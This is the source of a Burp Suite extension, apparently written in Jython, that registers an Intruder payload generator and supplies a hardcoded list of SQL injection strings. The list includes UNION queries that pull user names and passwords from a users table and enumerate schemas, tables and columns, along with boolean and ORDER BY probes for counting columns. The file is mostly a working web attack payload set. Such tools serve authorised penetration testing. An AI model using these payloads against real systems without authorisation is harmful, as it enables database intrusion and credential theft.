# -*- coding: utf-8 -*-

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("SQL Injection Payload Generator")
        self._callbacks.registerIntruderPayloadGeneratorFactory(self)
        print("SQL Injection Payload Generator loaded")
    
    def getGeneratorName(self):
        return "SQL Injection Payloads"
    
    def createNewInstance(self, attack):
        return SQLPayloadGenerator()

class SQLPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self.payloads = [

        #NO ENCODED
        #UNION
        " or 1 = 1 union select DISTINCT(table_schema), COUNT(*) from information_schema.tables group by TABLE_SCHEMA#",
        " or 1 = 1 union select null, concat(first_name,0x0a,last_name,0x0a,password) from users#",
        " or 1 = 1 union select user, password FROM users#",
        " or 1 = 1 UNION SELECT USER, PASSWORD from USERS#",
        " or 1 = 1 union select null, null, null#",
        " or 1 = 1 union select null, table_name FROM information_schema.tables#",
        " or 1 = 1 union select null, column_name FROM information_schema.columns#",
        " or 1 = 1 UNION SELECT 1,2#",
        " or 1 = 1 UNION SELECT 1,2,3#",

        #BOOLEAN
        " or 1 = 1 AND 1=1#",
        " or 1 = 1 AND 1=2#",
        " or 1 = 1 ORDER BY 1#",
        " or 1 = 1 ORDER BY 2#",
        " or 1 = 1 ORDER BY 3#",
        " or 1 = 1 OR 'a'='a",
        " or 1 = 1 GROUP BY 1,2#",
        " or 1 = 1 GROUP BY 1,2,3#",
        " order by 2",
        " order by 3",
        ]
        
        self.index = 0
    
    def hasMorePayloads(self):
        return self.index < len(self.payloads)
    
    def getNextPayload(self, baseValue):
        payload = self.payloads[self.index]
        self.index += 1
        return payload
    
    def reset(self):
        self.index = 0